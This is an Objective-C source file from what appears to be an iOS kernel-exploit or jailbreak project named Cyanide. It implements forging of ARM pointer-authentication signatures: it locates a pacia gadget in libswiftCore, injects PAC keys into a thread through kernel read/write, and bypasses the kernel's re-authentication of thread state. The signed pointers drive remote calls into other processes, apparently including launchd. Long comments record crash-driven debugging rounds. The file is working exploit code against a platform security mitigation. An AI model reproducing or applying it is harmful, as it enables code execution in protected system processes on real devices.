//
//  PAC.m
//  Cyanide
//
//  Created by seo on 4/4/26.
//
#import "PAC.h"
#import "RemoteCall.h"
#import "Thread.h"
#import "Exception.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/kutils.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <pthread.h>
#import <mach/mach.h>

extern bool gIsPACSupported;

extern uint64_t g_RC_gadgetPacia;

uint64_t native_strip(uint64_t address)
{
    return address & 0x7fffffffffULL;
}

uint64_t pacia(uint64_t ptr, uint64_t modifier)
{
    uint64_t stripped = native_strip(ptr);
    uint64_t result = stripped;
    if (gIsPACSupported) {
        __asm__ volatile (
            "mov x16, %[ptr]\n"
            "mov x17, %[mod]\n"
            ".long 0xDAC10230\n"
            "mov %[ptr], x16\n"
            : [ptr] "+r"(result)
            : [mod] "r"(modifier)
            : "x16", "x17"
        );
    }
    return result;
}

uint64_t ptrauth_blend_discriminator_wrapper(uint64_t diver, uint64_t discriminator)
{
    return (diver & 0xFFFFFFFFFFFFULL) | discriminator;
}

uint64_t ptrauth_string_discriminator_special(const char *name)
{
    if (strcmp(name, "pc") == 0) return 0x7481000000000000ULL;
    if (strcmp(name, "lr") == 0) return 0x77d3000000000000ULL;
    if (strcmp(name, "sp") == 0) return 0xcbed000000000000ULL;
    if (strcmp(name, "fp") == 0) return 0x4517000000000000ULL;
    return 0;
}

uint64_t find_pacia_gadget(void)
{
    const uint32_t paciaGadgetOpcodes[] = {
        0xDAC10230,   // pacia x16, x17
        0xAA1003E0,   // mov x0, x16
        0xD65F03C0    // ret
    };
    void *sym = dlsym(RTLD_DEFAULT, "$sSwySWSnySiGciM");    //dsc's /usr/lib/swift/libswiftCore.dylib; Swift.UnsafeMutableRawBufferPointer.subscript.modify : (Swift.Range<Swift.Int>) -> Swift.UnsafeRawBufferPointer
    if (!sym) {
        printf("[%s:%d] $sSwySWSnySiGciM symbol not found\n", __FUNCTION__, __LINE__);
        return 0;
    }
    uint64_t symAddr = native_strip((uint64_t)sym);
    uint8_t *searchBase = (uint8_t *)(uintptr_t)symAddr;
    for (size_t offset = 0; offset + sizeof(paciaGadgetOpcodes) <= 0x1000; offset += 4) {
        if (memcmp(searchBase + offset, paciaGadgetOpcodes, sizeof(paciaGadgetOpcodes)) == 0) {
            return symAddr + offset;
        }
    }
    printf("[%s:%d] pacia gadget not found\n", __FUNCTION__, __LINE__);
    return 0;
}

void pac_cleanup(mach_port_t pacThread, mach_port_t exceptionPort, void *stack)
{
    if (MACH_PORT_VALID(pacThread)) {
        thread_terminate(pacThread);
        mach_port_deallocate(mach_task_self_, pacThread);
    }
    destroy_exception_port(exceptionPort);
    if (stack)
        free(stack);
}

// ---------------------------------------------------------------------------
// Round 26 (panic-full-2026-10-03-160344, watchdog): the per-sign create →
// thread_set_exception_ports → sign → thread_terminate cycle below was the
// most frequent OWN-PROCESS exception-port MIG trap in the app — and that
// trap family is the ABBA window that has now watchdog-panicked the device
// three times (153120/161105: vs runningboardd task_policy_set; 160344: vs
// PerfPowerServices proc/task inspection holding our task lock while our
// arm-path thread_set_exception_ports held the target thread's lock). The
// MIG call runs the AMFI getOSEntitlementsFromProcSecure path, which takes
// our PROC lock while holding the target THREAD's lock; any system daemon
// inspecting this task takes the same two locks in the opposite order.
//
// So the signing context is now created ONCE per process (lazily, recreated
// only if the thread dies) and REUSED for every signature. A reuse costs
// thread_set_state (KRW wrapper) + thread_resume + the trap + a park — none
// of which enters the exception-ports MIG path or the AMFI entitlement
// check. thread_create's global thread-creation lock is likewise paid once
// instead of per sign (160344: 67 processes, launchd included, starved on
// that lock while it was held by a thread blocked on our task lock).
//
// Round 28: the park no longer replies a fabricated thread_suspend state
// into the exception (three CODESIGNING kills — the kernel poisons ANY
// userspace-fabricated pc that rides an exception reply). It now suspends
// the thread first and replies the trapped state VERBATIM; the kernel only
// ever re-verifies state it delivered itself. See pac_sign_cached.
//
// Serialized by construction: every caller reaches this through remote_pac →
// excport_op_begin (the round-21 process-wide serializer), so the statics
// below are single-threaded.
static mach_port_t g_pacSignThread     = MACH_PORT_NULL;
static uint64_t    g_pacSignThreadAddr = 0;
static mach_port_t g_pacSignPort       = MACH_PORT_NULL;
static void       *g_pacSignStack      = NULL;
// 0 = created but not yet canaried, 1 = canary passed, -1 = latched OFF
// (round-25 per-sign fallback for the rest of the process).
static int         g_pacSignCacheState = 0;
// Round 29: signs remaining before the canary passes — 2, so the canary
// covers the recycled-thread reinstall (the 182533 kill shape), not just
// the always-safe fresh-thread first sign.
static int         g_pacSignCanaryLeft = 2;

// Mirrors Exception.m (not exported from there).
#define PAC_EXC_MSG_SIZE 0x160

static void pac_sign_context_destroy(void)
{
    if (MACH_PORT_VALID(g_pacSignThread)) {
        thread_terminate(g_pacSignThread);
        mach_port_deallocate(mach_task_self_, g_pacSignThread);
    }
    g_pacSignThread     = MACH_PORT_NULL;
    g_pacSignThreadAddr = 0;
    destroy_exception_port(g_pacSignPort);
    g_pacSignPort       = MACH_PORT_NULL;
    if (g_pacSignStack)
        free(g_pacSignStack);
    g_pacSignStack = NULL;
}

// A trap that is NOT the current sign's result must never be mistaken for one
// (a stale message would hand the caller a stale x16 — a wrong signature
// dispatched into the target). Drain happens at (re)creation and before every
// sign; normally a no-op. Returns the number of strays drained so the caller
// can treat any desync as fatal for the context (destroy + oneshot fallback).
static int pac_sign_port_drain(const char *why)
{
    ExceptionMessage junk;
    int drained = 0;
    while (mach_msg(&junk.Head, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                    PAC_EXC_MSG_SIZE, g_pacSignPort, 0,
                    MACH_PORT_NULL) == KERN_SUCCESS)
        drained++;
    if (drained)
        printf("[PAC] round28: drained %d stray trap(s) on the signing port "
               "(%s) — not sign results\n", drained, why ?: "stale");
    return drained;
}

static bool pac_sign_context_create(void)
{
    pac_sign_context_destroy();   // idempotent reset of a half-dead context

    kern_return_t kr = thread_create(mach_task_self_, &g_pacSignThread);
    if (kr != KERN_SUCCESS) {
        printf("[PAC] round28: signing thread_create failed: %s (0x%x)\n",
               mach_error_string(kr), kr);
        goto fail;
    }
    g_pacSignStack = malloc(0x4000);
    if (!g_pacSignStack) {
        printf("[PAC] round28: signing stack alloc failed\n");
        goto fail;
    }
    memset(g_pacSignStack, 0, 0x4000);

    g_pacSignPort = create_exception_port();
    if (!g_pacSignPort) {
        printf("[PAC] round28: create_exception_port failed\n");
        goto fail;
    }
    // THE one-time exception-ports MIG trap for the whole process lifetime of
    // this context. Still routed through the round-21 serializer by the caller.
    kr = thread_set_exception_ports(g_pacSignThread,
                                    EXC_MASK_BAD_ACCESS,
                                    g_pacSignPort,
                                    EXCEPTION_STATE | MACH_EXCEPTION_CODES,
                                    ARM_THREAD_STATE64);
    if (kr != KERN_SUCCESS) {
        printf("[PAC] round28: thread_set_exception_ports failed: 0x%x (%s)\n",
               kr, mach_error_string(kr));
        goto fail;
    }
    g_pacSignThreadAddr = task_get_ipc_port_kobject(task_self(), g_pacSignThread);
    if (!g_pacSignThreadAddr) {
        printf("[PAC] round28: task_get_ipc_port_kobject failed\n");
        goto fail;
    }
    printf("[PAC] round28: signing context created (thread=0x%x) — cached for "
           "reuse; per-sign exception-port MIG traps eliminated\n",
           g_pacSignThread);
    return true;

fail:
    pac_sign_context_destroy();
    return false;
}

// The context is reusable only if the signing thread sits exactly where the
// last sign parked it: alive, suspended once. Anything else (died, escaped,
// wedged) means recreate from scratch.
static bool pac_sign_context_usable(void)
{
    if (!MACH_PORT_VALID(g_pacSignThread) || !MACH_PORT_VALID(g_pacSignPort) ||
        !g_pacSignStack || !g_pacSignThreadAddr)
        return false;
    thread_basic_info_data_t info;
    mach_msg_type_number_t cnt = THREAD_BASIC_INFO_COUNT;
    if (thread_info(g_pacSignThread, THREAD_BASIC_INFO,
                    (thread_info_t)&info, &cnt) != KERN_SUCCESS)
        return false;
    return info.suspend_count == 1;
}

// Round 28: the round-25 per-sign path, kept as the fail-closed fallback for
// when the cached context can't be built or fails its canary. It pays one
// thread_create + thread_set_exception_ports per signature (the ABBA window
// round 26 set out to close) but is the regression-free baseline: better a
// signing path that costs the old window than one that dispatches a thread
// into a bad state.
static uint64_t remote_pac_oneshot(uint64_t address, uint64_t modifier,
                                   uint64_t keyA, uint64_t keyB)
{
    mach_port_t pacThread = MACH_PORT_NULL;
    kern_return_t kr = thread_create(mach_task_self_, &pacThread);
    if (kr != KERN_SUCCESS) {
        printf("[PAC] oneshot: thread_create failed: %s (0x%x)\n", mach_error_string(kr), kr);
        krw_set_nonfatal(false);
        return -1;
    }
    void *stack = malloc(0x4000);
    if (!stack) {
        printf("[PAC] oneshot: stack alloc failed\n");
        pac_cleanup(pacThread, MACH_PORT_NULL, NULL);
        krw_set_nonfatal(false);
        return -1;
    }
    memset(stack, 0, 0x4000);
    uint64_t sp = (uint64_t)(uintptr_t)stack + 0x2000;

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    state.__sp = sp;
    state.__pc = pacia(g_RC_gadgetPacia, ptrauth_string_discriminator("pc"));
    state.__lr = pacia(0x401, ptrauth_string_discriminator("lr"));

    state.__x[0]  = 0;
    state.__x[1]  = address;
    state.__x[2]  = modifier;
    state.__x[3]  = (uint64_t)pacThread;
    state.__x[16] = address;
    state.__x[17] = modifier;

    mach_port_t exceptionPort = create_exception_port();
    if (!exceptionPort) {
        printf("[PAC] oneshot: create_exception_port failed\n");
        pac_cleanup(pacThread, MACH_PORT_NULL, stack);
        krw_set_nonfatal(false);
        return -1;
    }
    kr = thread_set_exception_ports(pacThread,
                                    EXC_MASK_BAD_ACCESS,
                                    exceptionPort,
                                    EXCEPTION_STATE | MACH_EXCEPTION_CODES,
                                    ARM_THREAD_STATE64);
    if (kr != KERN_SUCCESS) {
        printf("[PAC] oneshot: thread_set_exception_ports failed: 0x%x (%s)\n",
               kr, mach_error_string(kr));
        pac_cleanup(pacThread, exceptionPort, stack);
        krw_set_nonfatal(false);
        return -1;
    }
    uint64_t pacThreadAddr = task_get_ipc_port_kobject(task_self(), pacThread);
    if (!pacThreadAddr) {
        printf("[PAC] oneshot: task_get_ipc_port_kobject failed\n");
        pac_cleanup(pacThread, exceptionPort, stack);
        krw_set_nonfatal(false);
        return -1;
    }
    if (!thread_set_state_wrapper(pacThread, pacThreadAddr, &state)) {
        printf("[PAC] oneshot: thread_set_state_wrapper failed\n");
        pac_cleanup(pacThread, exceptionPort, stack);
        krw_set_nonfatal(false);
        return -1;
    }
    thread_set_pac_keys(pacThreadAddr, keyA, keyB);
    kr = thread_resume(pacThread);
    if (kr != KERN_SUCCESS) {
        printf("[PAC] oneshot: thread_resume failed: 0x%x (%s)\n", kr, mach_error_string(kr));
        pac_cleanup(pacThread, exceptionPort, stack);
        krw_set_nonfatal(false);
        return -1;
    }
    ExceptionMessage exc;
    memset(&exc, 0, sizeof(exc));
    if (!wait_exception(exceptionPort, &exc, 100, false)) {
        printf("[PAC] oneshot: wait_exception failed\n");
        pac_cleanup(pacThread, exceptionPort, stack);
        krw_set_nonfatal(false);
        return -1;
    }
    uint64_t signedAddress = exc.threadState.__x[16];
    pac_cleanup(pacThread, exceptionPort, stack);
    krw_set_nonfatal(false);
    return signedAddress;
}

// Round 28: one signature on the cached context. Returns the signed value,
// or -1 on failure (context destroyed; the caller falls back to one-shot).
// A failure of the PARK (after the signature was captured) latches the
// cache off but still returns the valid signature — the signature and the
// park are independent outcomes.
static uint64_t pac_sign_cached(uint64_t address, uint64_t modifier,
                                uint64_t keyA, uint64_t keyB)
{
    // A stray message means the port sequence desynced (e.g. a previous park
    // resumed the thread into a re-fault). Never mistake a stale trap for a
    // sign result: destroy and let the caller fall back to one-shot.
    if (pac_sign_port_drain("pre-sign") > 0) {
        printf("[PAC] round28: stray trap(s) on the signing port — context "
               "desynced; destroying, caller falls back to oneshot\n");
        pac_sign_context_destroy();
        return -1;
    }

    void *stack = g_pacSignStack;
    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    state.__sp = (uint64_t)(uintptr_t)stack + 0x2000;
    state.__pc = pacia(g_RC_gadgetPacia, ptrauth_string_discriminator("pc"));
    state.__lr = pacia(0x401, ptrauth_string_discriminator("lr"));

    state.__x[0]  = 0;
    state.__x[1]  = address;
    state.__x[2]  = modifier;
    state.__x[3]  = (uint64_t)g_pacSignThread;
    state.__x[16] = address;
    state.__x[17] = modifier;

    // Same install composition as every successful first-run sign since
    // round 25: thread_set_state_wrapper pokes TH_IN_MACH_EXCEPTION via KRW
    // around the MIG thread_set_state, which bypasses the kernel's userspace
    // PAC re-authentication of the state — the fabricated gadget pc/lr below
    // are never kernel-authenticated on this path.
    if (!thread_set_state_wrapper(g_pacSignThread, g_pacSignThreadAddr, &state)) {
        printf("[PAC] cached sign: thread_set_state_wrapper failed\n");
        pac_sign_context_destroy();
        return -1;
    }
    thread_set_pac_keys(g_pacSignThreadAddr, keyA, keyB);
    kern_return_t kr = thread_resume(g_pacSignThread);
    if (kr != KERN_SUCCESS) {
        printf("[PAC] cached sign: thread_resume failed: 0x%x (%s)\n",
               kr, mach_error_string(kr));
        pac_sign_context_destroy();
        return -1;
    }
    ExceptionMessage exc;
    memset(&exc, 0, sizeof(exc));
    if (!wait_exception(g_pacSignPort, &exc, 100, false)) {
        printf("[PAC] cached sign: wait_exception failed\n");
        pac_sign_context_destroy();
        return -1;
    }
    uint64_t signedAddress = exc.threadState.__x[16];

    // Re-park for the next sign INSTEAD of thread_terminate.
    //
    // Round 28 (Cyanide-2026-10-03-171344 / -173844 / -174049.ips — three
    // identical EXC_BAD_ACCESS/CODESIGNING "Invalid Page" kills, pc poisoned
    // to 0xffff8001…): the round-26/27 park REPLIED to the exception with a
    // FABRICATED state (pc=thread_suspend signed by userspace pacia). States
    // installed via an EXCEPTION REPLY are authenticated by the kernel
    // against the thread's own diversifier, and userspace pacia cannot
    // produce a signature that passes — round 27 proved even the textbook
    // sign_state recipe (special thread-state discriminators + __flags
    // diversifier + cleared kernel-signed bits) gets poisoned. Conclusion:
    // NO fabricated value may ever ride an exception reply.
    //
    // So the park fabricates nothing. Suspend the thread FIRST (plain MIG on
    // our own thread — synchronous), then reply with the trapped state
    // VERBATIM: the kernel re-verifies its own delivered signature
    // (production-proven — RemoteCall.m "replying unmodified; re-trap
    // returns to our port"), and the suspended thread never executes it. The
    // next sign's thread_set_state_wrapper wholesale-overwrites the entire
    // state before thread_resume, so even a hypothetically poisoned park
    // state is discarded without ever running. The kernel never receives a
    // fabricated signed value from this flow, and the thread can never
    // execute one — a CODESIGNING kill from this path is impossible by
    // construction.
    kern_return_t skr = thread_suspend(g_pacSignThread);
    if (skr != KERN_SUCCESS) {
        printf("[PAC] round28: park thread_suspend failed: 0x%x (%s) — context "
               "destroyed, cache latched OFF (round-25 fallback from the next "
               "sign); this signature is valid, returning it\n",
               skr, mach_error_string(skr));
        g_pacSignCacheState = -1;
        pac_sign_context_destroy();
        return signedAddress;
    }
    reply_with_state(&exc, &exc.threadState);   // verbatim — see above
    return signedAddress;
}

static uint64_t remote_pac_gated(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifier) {
    if(!gIsPACSupported)
        return address;

    if(!g_RC_gadgetPacia) {
        uint64_t gadgetAddr = find_pacia_gadget();
        if(gadgetAddr == 0) {
            printf("[%s:%d] find_pacia_gadget failed\n", __FUNCTION__, __LINE__);
            return -1;
        }
        g_RC_gadgetPacia = gadgetAddr;
    }

    address = native_strip(address);

    // KRW-loss guard: reading the thread's PAC keys with dead sockets would
    // exit(0) the whole process via early_kread's FAILURE path — mid-remote-
    // call that strands a trapped launchd thread and panics the device
    // (live 10.log 17:50:30). Nonfatal mode makes the read zero-fill instead,
    // and the ready-check below turns that into a clean -1 ("do not dispatch").
    krw_set_nonfatal(true);
    // Round 17: prefer the session's cached keys (captured at init while the
    // trojan thread was provably alive). The per-call re-read this replaces
    // broke the moment the source thread exited: zero/garbage keys signed
    // states that faulted on resume inside launchd — the 12:31:23 crash-loop.
    uint64_t keyA = 0, keyB = 0;
    if (!rc_session_pac_keys(&keyA, &keyB)) {
        keyA = thread_get_rop_pid(remoteThreadAddr);
        keyB = thread_get_jop_pid(remoteThreadAddr);
    }
    if (!keyA && !keyB) {
        // Zero keys mean the read hit a dead/freed thread slot (zero-fill).
        // Signing with them produces states that fault on resume inside the
        // target — refuse; callers treat -1 as do-not-dispatch.
        printf("[%s:%d] PAC keys read as zero (source thread dead?) — refusing "
               "to sign\n", __FUNCTION__, __LINE__);
        krw_set_nonfatal(false);
        return -1;
    }
    if (!kexploit_krw_ready()) {
        krw_set_nonfatal(false);
        printf("[%s:%d] KRW LOST while reading PAC keys — refusing to sign\n",
               __FUNCTION__, __LINE__);
        return -1;
    }

    // Round 29: the cache is DISABLED BY DEFAULT. Four CODESIGNING kills in
    // ~90 minutes (171344/173844/174049: fabricated park REPLY states poisoned
    // by the kernel; 182533: the SECOND wrapper install on the recycled
    // thread — after a completed exception cycle — poisoned the gadget pc,
    // while the byte-identical install on a FRESH thread_create'd thread has
    // never failed). The kernel-side condition that breaks the set_state
    // bypass on recycled threads is not knowable from userspace with the
    // confidence the exploit path requires, so every sign now uses the
    // round-25 oneshot path that was stable across every device session
    // until round 26. The cached path stays compiled behind a debug flag for
    // future investigation:
    //   defaults write <bundle-id> pacSignCacheEnabled -bool true
    static int g_pacSignCacheEnabled = -1;   // -1 = unread, 0 = off, 1 = on
    if (g_pacSignCacheEnabled < 0) {
        g_pacSignCacheEnabled = [[NSUserDefaults standardUserDefaults]
                                 boolForKey:@"pacSignCacheEnabled"] ? 1 : 0;
        printf("[PAC] round29: cached signing context %s — %s\n",
               g_pacSignCacheEnabled ? "ENABLED by debug flag (EXPERIMENTAL)"
                                     : "DISABLED by default",
               g_pacSignCacheEnabled ? "canary now covers the recycled-thread "
                                       "reinstall that killed 182533"
                                     : "using round-25 per-sign oneshot "
                                       "signing (four CODESIGNING kills on "
                                       "cache reuse: 171344/173844/174049/"
                                       "182533)");
    }
    // Round 28: prefer the cached signing context (created once per process,
    // canaried on first use). Any failure latches the cache OFF and falls back
    // to the round-25 per-sign path — signing must never stop working because
    // of the cache. The round-28 park (suspend-first + verbatim reply) sends
    // no fabricated state to the kernel, so cache failures are ordinary -1s
    // here, never process kills — this ladder is always reachable.
    //
    // Round 29 canary hardening: the round-28 canary was FALSE COMFORT — it
    // validated only the FIRST sign (always on a fresh thread, the shape that
    // never fails) and PASSED 5 ms before the SECOND sign — the first on the
    // RECYCLED thread — killed the process (182533). The canary therefore now
    // requires TWO consecutive good cached signs, so it covers the recycled-
    // thread reinstall that is the actual reuse hazard.
    if (g_pacSignCacheEnabled == 1 && g_pacSignCacheState >= 0) {
        bool canaryInProgress = (g_pacSignCacheState == 0);
        uint64_t signedCached = -1;
        if (pac_sign_context_usable() || pac_sign_context_create())
            signedCached = pac_sign_cached(address, modifier, keyA, keyB);
        if (signedCached != (uint64_t)-1 && signedCached != 0 &&
            (signedCached & 0x7fffffffffULL) == native_strip(address) &&
            signedCached != native_strip(address)) {
            if (canaryInProgress && g_pacSignCacheState == 0 &&
                --g_pacSignCanaryLeft <= 0) {
                g_pacSignCacheState = 1;
                printf("[PAC] round29: cached signing context canary PASSED "
                       "(2 consecutive signs, incl. recycled-thread reinstall) "
                       "— per-sign exception-port MIG traps eliminated\n");
            }
            krw_set_nonfatal(false);
            return signedCached;
        }
        pac_sign_context_destroy();
        g_pacSignCacheState = -1;
        printf("[PAC] round29: cached signing context %s — DISABLED; falling "
               "back to per-sign contexts (round-25 behavior) for the rest of "
               "this process\n",
               canaryInProgress ? "FAILED ITS CANARY" : "broke mid-session");
    }
    return remote_pac_oneshot(address, modifier, keyA, keyB);
}

// Round 21 (panics 1+3, Cyanide<->runningboardd ABBA): remote_pac creates a
// thread and installs an exception port on it via thread_set_exception_ports
// — an own-process exception-port trap, once per signing operation. Route the
// whole operation through the lifecycle gate + process-wide serializer so it
// (a) refuses to start while the app is backgrounded/terminating (when rbd
// policy-sets this task — the deadlock window) and (b) never runs inside the
// trap family concurrently with another of our threads. A refusal returns -1,
// which every caller already treats as do-not-dispatch (the safe abort:
// reply with the thread's unmodified trapped state).
uint64_t remote_pac(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifier) {
    if(!gIsPACSupported)
        return address;

    if (!excport_op_begin("remote_pac")) {
        printf("[PAC] remote_pac refused by lifecycle gate — do-not-dispatch\n");
        return -1;
    }
    uint64_t result = remote_pac_gated(remoteThreadAddr, address, modifier);
    excport_op_end();
    return result;
}
